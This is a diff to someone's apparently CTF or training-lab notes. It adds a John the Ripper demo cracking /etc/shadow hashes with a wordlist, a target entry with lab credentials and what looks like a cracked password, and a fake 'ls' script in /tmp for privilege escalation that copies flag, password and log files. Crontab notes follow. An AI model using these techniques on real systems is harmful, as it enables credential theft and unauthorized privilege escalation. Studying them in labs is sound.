@@ -62,6 +62,29 @@ methodology
 - 
 
 
+# JOHN THE RIPPER DEMO
+
+```
+sudo apt install john
+
+
+vim shadow    #put the entire line into the file from /etc/shadow
+john --wordlist=rockyou.txt shadow.txt --show 
+
+
+                      ^ reconnaissance will show you what wordlist you need to use for john in order to pass le test
+
+
+
+
+
+
+```
+
+
+
+
+
 
 # CTFD
 
@@ -102,6 +125,7 @@ Action: Perform SSH masquerade and redirect to the next target. No survey requir
 T1
 Hostname: unknown
 IP: 192.168.28.27
+ghjcnbnenrf      (zeus)
 OS: Linux ver: Unknown
 Creds: comrade :: StudentPrivPassword
 Last Known Ports: unknown
@@ -119,6 +143,47 @@ Last Known Ports: unknown
 PSP: unknown
 Malware: unknown
 Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+
+
+USING A FALSE BINARY TO PERFORM PRIVESC (sussy ls command)
+
+example:
+> cd /tmp
+> touch ls
+
+#!/bin/bash
+/bin/cat /home/billybob/f!@g1.txt > /tmp/actualFlag.txt
+/bin/cat /home/billybob/10-million-password-list-top-10000.txt > /tmp/passList.txt
+/bin/cat /home/billybob/logs > /tmp/logs
+/usr/bin/sudo -l > /tmp/sudoCommands
+
+
+change the commands accordingly
+
+
+crontabs: 
+
+> crontab -e
+
+make sure you use the cron guru website to build your crons
+
+append your command to the end of the crontab
+
+watch -n1 'what_to_watch' ##for ease of use
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 ```
 
